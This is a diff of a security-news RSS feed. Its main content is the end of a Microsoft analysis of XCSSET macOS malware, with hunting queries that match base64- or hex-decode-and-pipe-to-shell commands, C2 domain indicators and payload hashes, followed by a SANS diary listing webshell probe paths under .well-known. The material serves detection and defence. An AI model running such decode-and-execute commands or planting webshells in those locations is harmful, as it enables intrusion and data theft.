project&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Microsoft Defender Antivirus&lt;/strong&gt; &lt;br /&gt;&amp;#8211; Trojan:MacOS/HackBrowserData.A&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Impact&lt;/td&gt;&lt;td&gt;&amp;#8211; Xcode project infection&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Microsoft Defender Antivirus&lt;/strong&gt; &lt;br /&gt;&amp;#8211; Behavior:MacOS/XCSSET.A&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Note: For detections associated with older variants of XCSSET, refer to our &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/03/11/new-xcsset-malware-adds-new-obfuscation-persistence-techniques-to-infect-xcode-projects/"&gt;March 2025 blog post&lt;/a&gt;.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="threat-intelligence-reports"&gt;Threat intelligence reports&lt;/h2&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="microsoft-defender-xdr-threat-analytics"&gt;Microsoft Defender XDR threat analytics&lt;/h3&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li class="wp-block-list-item"&gt;&lt;a href="https://security.microsoft.com/threatanalytics3/e70b90bb-dad2-4924-b056-5b504a77d1fb/overview"&gt;Tool profile: XCSSET&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="hunting-queries"&gt;Hunting queries&lt;/h2&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="microsoft-defender-xdr"&gt;Microsoft Defender XDR&lt;/h3&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Microsoft Defender XDR customers can run the following query to find related activity in their networks:&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Suspicious commands while building an Xcode project&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Search for suspicious commands related to this XCSSET when an Xcode project is being built.&lt;/p&gt;
+
+
+&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; notranslate"&gt;
+DeviceProcessEvents 
+| where ProcessCommandLine has_all("echo", "xxd -p -r", "| sh") or ProcessCommandLine has_all("echo", "base64 -d", "| sh")
+| where InitiatingProcessFileName has_any ("sh", "bash", "zsh") 
+| where InitiatingProcessCommandLine contains "/Developer/Xcode/DerivedData"
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Suspicious commands executed by XCSSET info-stealer module&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Search for suspicious commands related to decryption logic of data received from C2.&lt;/p&gt;
+
+
+&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; notranslate"&gt;
+DeviceProcessEvents
+| where ProcessCommandLine has_any ("base64 --decode", "base64 -d") and ProcessCommandLine has_all ("openssl enc -d", "cut -c1-32")
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Suspicious application creation&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Search for suspicious applications created in Temp folder by this XCSSET.&lt;/p&gt;
+
+
+&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; notranslate"&gt;
+DeviceFileEvents
+| where FolderPath matches regex @"/tmp/[a-zA-Z]\.app"
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3 class="wp-block-heading" id="microsoft-sentinel"&gt;Microsoft Sentinel&lt;/h3&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the &lt;a href="https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy"&gt;Microsoft Sentinel Content Hub&lt;/a&gt; to have the analytics rule deployed in their Sentinel workspace.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Below are the queries using&amp;nbsp;&lt;a href="https://learn.microsoft.com/azure/sentinel/normalization"&gt;Sentinel Advanced Security Information Model (ASIM) functions&lt;/a&gt;&amp;nbsp;to hunt threats across both Microsoft first-party and third-party data sources. ASIM also supports deploying parsers to specific workspaces&amp;nbsp;&lt;a href="https://aka.ms/DeployASIM"&gt;from GitHub&lt;/a&gt;, using an ARM template or manually.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Detect network IP and domain indicators of compromise using ASIM&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The following query checks IP addresses and domain IOCs across data sources supported by ASIM network session parser:&lt;/p&gt;
+
+
+&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate"&gt;
+//IP list and domain list- _Im_NetworkSession
+let lookback = 30d;
+let ioc_ip_addr = dynamic([]);
+let ioc_domains = dynamic(["cdntor.ru", "checkcdn.ru", "cdcache.ru", "applecdn.ru", "flowcdn.ru", "elasticdns.ru", "rublenet.ru", "figmastars.ru", "bulksec.ru", "dobetrix.ru", "figmacat.ru", "digichat.ru", "diggimax.ru", "cdnroute.ru", "sigmanow.ru", "fixmates.ru", "mdscache.ru", "trinitysol.ru", "verifysign.ru", "digitalcdn.ru", "windsecure.ru", "dobecdn.ru"]);
+_Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now())
+| where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains)
+| summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated),
+  EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p class="wp-block-paragraph"&gt;&lt;strong&gt;Detect domain and URL indicators of compromise using ASIM&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The following query checks domain and URL IOCs across data sources supported by ASIM web session parser.&lt;/p&gt;
+
+
+&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; notranslate"&gt;
+// file hash list - imFileEvent
+// Domain list - _Im_WebSession
+let ioc_domains = dynamic(["cdntor.ru", "checkcdn.ru", "cdcache.ru", "applecdn.ru", "flowcdn.ru", "elasticdns.ru", "rublenet.ru", "figmastars.ru", "bulksec.ru", "dobetrix.ru", "figmacat.ru", "digichat.ru", "diggimax.ru", "cdnroute.ru", "sigmanow.ru", "fixmates.ru", "mdscache.ru", "trinitysol.ru", "verifysign.ru", "digitalcdn.ru", "windsecure.ru", "dobecdn.ru"]);
+_Im_WebSession (url_has_any = ioc_domains)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 class="wp-block-heading" id="indicators-of-compromise"&gt;Indicators of compromise&lt;/h1&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Indicator&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Type&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;cdntor[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;checkcdn[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;cdcache[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;applecdn[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;flowcdn[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;elasticdns[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rublenet[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;figmastars[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;bulksec[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;dobetrix[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;figmacat[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;digichat[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;diggimax[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;cdnroute[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;sigmanow[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;fixmates[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;mdscache[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;trinitysol[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;verifysign[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;digitalcdn[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;windsecure[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;dobecdn[.]ru&lt;/td&gt;&lt;td&gt;Domain&lt;/td&gt;&lt;td&gt;C2 server&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;12ea52c4089d100e679a2350f03e598b2f3feebfbbd2ed5631a2a7a20b07e826&lt;/td&gt;&lt;td&gt;SHA-256&lt;/td&gt;&lt;td&gt;&lt;em&gt;/tmp/ancr&lt;/em&gt; (Modified version of HackBrowserData Github project)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5a212c5ce1e0f41e721ce0940afb381b694a2e32a6d19c1d2210f703636362df&lt;/td&gt;&lt;td&gt;SHA-256&lt;/td&gt;&lt;td&gt;&lt;em&gt;/tmp/b&lt;/em&gt; (fourth-stage payload)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0fbd0e1995472f308cf1ac8229a02c277035404426769fa50947a72c95ad7d31&lt;/td&gt;&lt;td&gt;SHA-256&lt;/td&gt;&lt;td&gt;&lt;em&gt;jey&lt;/em&gt; (establishes persistence through Git commits)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;f3bc158619b2aad17def966f0ac8dddc2107e4911a7c488d358d906f27ac2a2b&lt;/td&gt;&lt;td&gt;SHA-256&lt;/td&gt;&lt;td&gt;&lt;em&gt;/tmp/xmyyeqjx&lt;/em&gt; (&lt;em&gt;LaunchDaemon&lt;/em&gt; based persistence)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h1 class="wp-block-heading" id="references"&gt;References:&lt;/h1&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/security/blog/2025/03/11/new-xcsset-malware-adds-new-obfuscation-persistence-techniques-to-infect-xcode-projects/"&gt;https://www.microsoft.com/en-us/security/blog/2025/03/11/new-xcsset-malware-adds-new-obfuscation-persistence-techniques-to-infect-xcode-projects/&lt;/a&gt;&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;a href="https://github.com/Jinmo/applescript-disassembler"&gt;https://github.com/Jinmo/applescript-disassembler&lt;/a&gt;&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.trendmicro.com/en_us/research/20/h/xcsset-mac-malware--infects-xcode-projects--uses-0-days.html"&gt;https://www.trendmicro.com/en_us/research/20/h/xcsset-mac-malware–infects-xcode-projects–uses-0-days.html&lt;/a&gt;&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;a href="https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf"&gt;https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf&lt;/a&gt;&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/"&gt;https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/&lt;/a&gt;&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.jamf.com/blog/osx-xcsset-subverts-developer-environments/"&gt;https://www.jamf.com/blog/osx-xcsset-subverts-developer-environments/&lt;/a&gt;&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.sentinelone.com/blog/xcsset-malware-update-macos-threat-actors-prepare-for-life-without-python/"&gt;https://www.sentinelone.com/blog/xcsset-malware-update-macos-threat-actors-prepare-for-life-without-python/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="learn-more"&gt;Learn more&lt;/h2&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;For the latest security research from the Microsoft Threat Intelligence community, check out the &lt;a href="https://aka.ms/threatintelblog"&gt;Microsoft Threat Intelligence Blog&lt;/a&gt;.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;To get notified about new publications and to join discussions on social media, follow us on &lt;a href="https://www.linkedin.com/showcase/microsoft-threat-intelligence"&gt;LinkedIn&lt;/a&gt;, &lt;a href="https://x.com/MsftSecIntel"&gt;X (formerly Twitter)&lt;/a&gt;, and &lt;a href="https://bsky.app/profile/threatintel.microsoft.com"&gt;Bluesky&lt;/a&gt;.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the &lt;a href="https://thecyberwire.com/podcasts/microsoft-threat-intelligence"&gt;Microsoft Threat Intelligence podcast&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/09/25/xcsset-evolves-again-analyzing-the-latest-updates-to-xcssets-inventory/"&gt;XCSSET evolves again: Analyzing the latest updates to XCSSET’s inventory&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.microsoft.com/en-us/security/blog/?p=142570</guid></item><item><title>Webshells Hiding in .well-known Places, (Thu, Sep 25th)</title><link>https://isc.sans.edu/diary/rss/32320</link><description>&lt;p&gt;Ever so often, I see requests for files in .well-known recorded by our honeypots. As an example:&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Ever so often, I see requests for files in .well-known recorded by our honeypots. As an example:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;
+GET /.well-known/xin1.php?p
+Host: [honeypot host name]
+&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The file names indicate that they are likely looking for webshells. In my opinion, the reason they are looking in .well-known is that this makes a decent place to hide webshells without having them overwritten by an update to the site.&lt;/p&gt;
+
+&lt;p&gt;The .well-known directory is meant to be used for various informational files [1], and for example, for ACME TLS challenges. As a result, it is the only directory or file starting with &amp;quot;.&amp;quot; that must be accessible via the web server. But it is also &amp;quot;hidden&amp;quot; to Unix command line users. I have written about the various legitimate users of .well-known before [2].&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;We also see some requests for PHP files in the acme-challenge subdirectory, as well as the pki-challenge subdirectory:&lt;/p&gt;
+
+&lt;p&gt;Here are some of the more common, but not &amp;quot;standard&amp;quot; URLs in .well-known hit in our honeypots:&lt;/p&gt;
+
+&lt;p&gt;/.well-known/pki-validation/about.php&lt;br /&gt;
+/.well-known/about.php&lt;br /&gt;
+/.well-known/acme-challenge/cloud.php&lt;br /&gt;
+/.well-known/acme-challenge/about.php&lt;br /&gt;
+/.well-known/pki-validation/xmrlpc.php&lt;br /&gt;
+/.well-known/acme-challenge/index.php&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;[1]&amp;nbsp;https://datatracker.ietf.org/doc/html/rfc8615&lt;br /&gt;
+[2]&amp;nbsp;https://isc.sans.edu/diary/26564&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;--&lt;br /&gt;
+Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;SANS.edu&lt;/a&gt;&lt;br /&gt;
+&lt;a href="https://jbu.me/164"&gt;Twitter&lt;/a&gt;|&lt;img alt="image of an http request to .well-known/xin1.php?p" src="https://isc.sans.edu/diaryimages/images/Screenshot%202025-09-25%20at%207_23_18%E2%80%AFAM.png" style="width: 1px;" /&gt;&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32320</guid></item><item><title>Microsoft Unveils Microfluidic Cooling Breakthrough to Tame Overheating AI Chips</title><link>https://www.techrepublic.com/article/news-microsoft-microfluidic-cooling-ai-data-centers/</link><description>&lt;p&gt;Microsoft tests microfluidic cooling that removes heat three times better than cold plates, reducing GPU spikes and lowering energy consumption in AI data centers.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-microsoft-microfluidic-cooling-ai-data-centers/"&gt;Microsoft Unveils Microfluidic Cooling Breakthrough to Tame Overheating AI Chips&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4328753</guid><category>Artificial Intelligence</category><category>Data Centers</category><category>Hardware</category><category>Microsoft</category></item><item><title>ISC Stormcast For Thursday, September 25th, 2025 https://isc.sans.edu/podcastdetail/9628, (Thu, Sep 25th)</title><link>https://isc.sans.edu/diary/rss/32318</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32318</guid></item><item><title>Proofpoint’s New Agentic AI Cybersecurity Solutions Address 4 Key Challenges</title><link>https://www.techrepublic.com/article/news-proofpoint-agentic-ai-cybersecurity-solution/</link><description>&lt;p&gt;Proofpoint expands human-centric security to protect AI agents, safeguarding collaboration points and shared data in the agentic workspace.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-proofpoint-agentic-ai-cybersecurity-solution/"&gt;Proofpoint&amp;#8217;s New Agentic AI Cybersecurity Solutions Address 4 Key Challenges&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4328737</guid><category>Artificial Intelligence</category><category>News</category><category>Security</category></item><item><title>Guarding your family against the latest online threats</title><link>https://www.webroot.com/blog/2025/09/24/guarding-your-family-against-the-latest-online-threats/</link><description>&lt;p&gt;Parents across America face a growing wave of sophisticated online fraud designed to exploit their deepest fears and protective instincts. Americans reported losing more than $12.5 billion to fraud in 2024, representing a 25% increase over the prior year, according to new Federal Trade Commission data. Parents represent a particularly vulnerable target because scammers understand [&amp;#8230;]&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/09/24/guarding-your-family-against-the-latest-online-threats/" rel="nofollow"&gt;Guarding your family against the latest online threats&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Parents across America face a growing wave of sophisticated online fraud designed to exploit their deepest fears and protective instincts. Americans reported losing more than $12.5 billion to fraud in 2024, representing a 25% increase over the prior year, according to new Federal Trade Commission data.&lt;/p&gt;
@@ -2310,7 +2860,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 &lt;li&gt;StepSecurity: &lt;a href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised"&gt;Shai-Hulud: Self Replicating Work Compromises 500+ NPM Packages&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Palo Alto Networks Unit 42: &lt;a href="https://unit42.paloaltonetworks.com/npm-supply-chain-attack/" title="&amp;quot;Shai-Hulud&amp;quot; Worm Compromises npm Ecosystem in Supply Chain Attack (Updated September 18)"&gt;"Shai-Hulud" Worm Compromises npm Ecosystem in Supply Chain Attack (Updated September 18)&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Socket: &lt;a href="https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages" title="Updated and Ongoing Supply Chain Attack Targets CrowdStrike npm Packages"&gt;Updated and Ongoing Supply Chain Attack Targets CrowdStrike npm Packages&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;ReversingLabs: &lt;a href="https://www.reversinglabs.com/blog/malicious-npm-patch-delivers-reverse-shell"&gt;Malware found on npm infecting local package with reverse shell&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;ReversingLabs: &lt;a href="https://www.reversinglabs.com/blog/shai-hulud-worm-npm"&gt;Shai-hulud supply chain attack spreads token-stealing malware on npm&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;The information in this report is being provided “as is” for informational purposes only. CISA does not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA.&lt;/p&gt;
@@ -3774,141 +4324,7 @@ d6af1c9f5ce407e53ec73c8e7187ed804fb4f80cf8dbd6722fc69e15e135db2e
 &lt;p&gt;CISA encourages users and administrators to review newly released ICS advisories for technical details and mitigations.&lt;/p&gt;</description><guid isPermaLink="false">/node/23970</guid></item><item><title>CISA Releases Malware Analysis Report on Malicious Listener Targeting Ivanti Endpoint Manager Mobile Systems</title><link>https://www.cisa.gov/news-events/alerts/2025/09/18/cisa-releases-malware-analysis-report-malicious-listener-targeting-ivanti-endpoint-manager-mobile</link><description>&lt;p&gt;Today, CISA released a Malware Analysis Report detailing the functionality of two sets of malware obtained from an organization compromised by cyber threat actors exploiting &lt;a href="https://www.cve.org/CVERecord?id=CVE-2025-4427"&gt;CVE-2025-4427&lt;/a&gt; and &lt;a href="https://www.cve.org/CVERecord?id=CVE-2025-4428"&gt;CVE-2025-4428&lt;/a&gt; in Ivanti Endpoint Manager Mobile (Ivanti EPMM).&amp;nbsp;&amp;nbsp;&lt;/p&gt;
 &lt;p&gt;The Malware Analysis Report, &lt;em&gt;Malicious Listener for Ivanti EPMM Systems&lt;/em&gt;, provides guidance to help organizations detect and mitigate these threats, including indicators of compromise and YARA and SIGMA rules. Mitigations include highlighting the need to upgrade Ivanti EPMM systems to the latest version and to treat mobile device management systems as high-value assets with strengthened monitoring and restrictions.&amp;nbsp;&lt;/p&gt;
 &lt;p&gt;For more information, visit &lt;a href="https://www.cisa.gov/news-events/analysis-reports/ar25-261a?utm_source=MalwareAnalysisReport&amp;amp;utm_medium=Alert" title="Malware Analysis Report"&gt;https://www.cisa.gov/news-events/analysis-reports/ar25-261a&lt;/a&gt;.&amp;nbsp;&amp;nbsp;&lt;/p&gt;</description><guid isPermaLink="false">/node/23974</guid></item><item><title>Cybercriminals Have a Weird New Way to Target You With Scam Texts</title><link>https://www.wired.com/story/sms-blasters-scam-texts/</link><description>Scammers are now using “SMS blasters” to send out up to 100,000 texts per hour to phones that are tricked into thinking the devices are cell towers. Your wireless carrier is powerless to stop them.</description><guid isPermaLink="false">68caccec31ebff062dec7f2e</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / Security News</category><category>cybersecurity</category><category>security</category><category>hacking</category><category>malware</category><category>Crime</category><category>scams</category><category>phones</category><category>texting</category><category>Having a Blast</category></item><item><title>Huang ‘Disappointed’ as Chinese Government Restricts Use of Nvidia AI Chips</title><link>https://www.techrepublic.com/article/news-nvidia-china-ban/</link><description>&lt;p&gt;Beijing seeks to encourage domestic replacements for the RTX Pro 6000D. &lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-nvidia-china-ban/"&gt;Huang ‘Disappointed’ as Chinese Government Restricts Use of Nvidia AI Chips&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4327763</guid><category>APAC</category><category>Artificial Intelligence</category><category>Hardware</category><category>International</category><category>News</category></item><item><title>ISC Stormcast For Thursday, September 18th, 2025 https://isc.sans.edu/podcastdetail/9618, (Thu, Sep 18th)</title><link>https://isc.sans.edu/diary/rss/32298</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32298</guid></item><item><title>Exploring Uploads in a Dshield Honeypot Environment &amp;#x5b;Guest Diary&amp;#x5d;, (Thu, Sep 18th)</title><link>https://isc.sans.edu/diary/rss/32296</link><description>&lt;p&gt;&amp;#x5b;This is a Guest Diary by Nathan Smisson, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program&amp;#x5d;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;[This is a Guest Diary by Nathan Smisson, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program]&lt;/p&gt;
-
